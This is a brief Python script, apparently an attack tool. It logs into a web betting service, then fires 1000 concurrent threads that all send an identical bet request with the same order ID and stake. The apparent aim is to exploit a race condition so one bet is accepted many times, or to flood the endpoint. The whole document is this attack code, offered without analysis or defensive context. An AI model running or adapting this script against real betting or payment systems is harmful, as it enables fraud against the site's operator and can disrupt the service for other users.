import urllib
import http.cookiejar
import getpost
import threading
import time

cookie = http.cookiejar.CookieJar()
cjhdr = urllib.request.HTTPCookieProcessor(cookie)
opener = urllib.request.build_opener(cjhdr)
urllib.request.install_opener(opener)

# 登录
data1 = {
    'username': 1,
    'password': 1,
    'vcode': 'lxy1',
    'state': 'from',
    'remember': 1,
    'ac': 'login',
}
getpost.http_post('c=ajax&a=user_do', data1)
time.sleep(2)
# 下注
data2 = {'c': 'NewGuess',
         'a': 'bet',
         'choice_title': '000',
         'title': 0,
         'cid': 3435,
         'banker_uid': 343533,
         'choice': 1,
         'odds': 1,
         'pos': 0,
         'money_type': 1,
         'order_id': 145811604034353210,
         'money': 10000,
         'bet_index': 2,
         '_': 1458115614730,
         }

# 多线程并发
threads = []
for i in range(0, 1000):
    t = threading.Thread(target=getpost.http_get, args=(data2,))
    threads.append(t)

for t in threads:
    # t.setDaemon(True)
    t.start()
